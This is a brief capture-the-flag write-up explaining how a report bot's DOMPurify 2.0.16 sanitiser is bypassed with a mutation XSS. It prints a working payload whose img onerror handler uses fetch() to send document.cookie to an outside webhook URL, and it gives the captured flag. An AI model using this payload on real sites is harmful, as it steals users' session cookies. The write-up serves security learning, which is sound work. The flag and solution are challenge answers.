# Drunken Bathrobe

First we have the code, analyse it and we can see the `bot.js` file. This is probably a XSS. Now go on the [web page](http://hctf.hackappatoi.com:8002/), we have a `/report` URL where we can send a message to the admin, i'm sure this is a XSS.

Read the code, we can see the `dompurify` is imported and used by the bot to sanitize the message (`res = DOMPurify.sanitize(res);`)...
Read the Dockerfile and get the dompurify version `dompurify@2.0.16`, check on google, there is a vulnerability a mXSS pass the `sanitize` function.
Create an exploit and encode it:

```html
<mamathth><mtext><table><mglyph><style><mamathth><table id="</table>"><img src onerror=fetch('https://webhook.site/f404f402-495f-4911-8cef-c88946aed1dd/?'%2Bdocument.cookie)>
```

Send it on the `/report` page and get the flag: `https://webhook.site/f404f402-495f-4911-8cef-c88946aed1dd?flag=hctf%7Bmy_n3w_flag-fl4vor3d_c0ck7ail%7D` -> `hctf{my_n3w_flag-fl4vor3d_c0ck7ail}`
